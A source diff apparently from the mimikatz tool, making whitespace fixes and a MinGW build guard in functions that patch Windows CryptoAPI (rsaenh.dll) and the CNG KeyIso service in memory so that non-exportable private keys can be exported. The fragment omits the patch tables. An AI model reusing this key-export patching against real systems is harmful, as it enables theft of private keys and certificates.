@@ -60,7 +60,7 @@ NTSTATUS kuhl_m_crypto_p_capi(int argc, wchar_t * argv[])
 		aPatch4000Memory = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
 	KULL_M_MEMORY_SEARCH sMemory = {{{K_CPExportKey, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE}, 0}, NULL};
 	PKULL_M_PATCH_GENERIC currentReference4001, currentReference4000;
-	
+
 	currentReference4001 = kull_m_patch_getGenericFromBuild(Capi4001References, ARRAYSIZE(Capi4001References), MIMIKATZ_NT_BUILD_NUMBER);
 	currentReference4000 = kull_m_patch_getGenericFromBuild(Capi4000References, ARRAYSIZE(Capi4000References), MIMIKATZ_NT_BUILD_NUMBER);
 	if(currentReference4001 && currentReference4000)
@@ -72,7 +72,7 @@ NTSTATUS kuhl_m_crypto_p_capi(int argc, wchar_t * argv[])
 		if(kull_m_process_getVeryBasicModuleInformationsForName(&KULL_M_MEMORY_GLOBAL_OWN_HANDLE, L"rsaenh.dll", &iModuleRsaEnh))
 		{
 			sMemory.kull_m_memoryRange.size = iModuleRsaEnh.SizeOfImage - ((PBYTE) K_CPExportKey - (PBYTE) iModuleRsaEnh.DllBase.address);
-		
+
 			if(	kull_m_patch(&sMemory, &aPattern4001Memory, currentReference4001->Search.Length, &aPatch4001Memory, currentReference4001->Patch.Length, currentReference4001->Offsets.off0, NULL, 0, NULL, NULL)	&&
 				kull_m_patch(&sMemory, &aPattern4000Memory, currentReference4000->Search.Length, &aPatch4000Memory, currentReference4000->Patch.Length, currentReference4000->Offsets.off0, NULL, 0, NULL, NULL)	)
 				kprintf(L"Local CryptoAPI patched\n");
@@ -80,7 +80,7 @@ NTSTATUS kuhl_m_crypto_p_capi(int argc, wchar_t * argv[])
 				PRINT_ERROR_AUTO(L"kull_m_patch");
 
 		} else PRINT_ERROR_AUTO(L"kull_m_process_getVeryBasicModuleInformationsForName");
-	}					
+	}
 	return STATUS_SUCCESS;
 }
 
@@ -125,7 +125,7 @@ KULL_M_PATCH_GENERIC CngReferences[] = {
 NTSTATUS kuhl_m_crypto_p_cng(int argc, wchar_t * argv[])
 {
 	NCRYPT_PROV_HANDLE hProvider;
-	__try 
+	__try
 	{
 		if(NT_SUCCESS(NCryptOpenStorageProvider(&hProvider, NULL, 0)))
 		{
@@ -133,9 +133,11 @@ NTSTATUS kuhl_m_crypto_p_cng(int argc, wchar_t * argv[])
 			kull_m_patch_genericProcessOrServiceFromBuild(CngReferences, ARRAYSIZE(CngReferences), L"KeyIso", (MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_BUILD_8) ? L"ncrypt.dll" : L"ncryptprov.dll", TRUE);
 		}
 	}
+#ifndef __MINGW32__
 	__except(GetExceptionCode() == ERROR_DLL_NOT_FOUND)
 	{
 		PRINT_ERROR(L"No CNG\n");
 	}
+#endif
 	return STATUS_SUCCESS;
 }
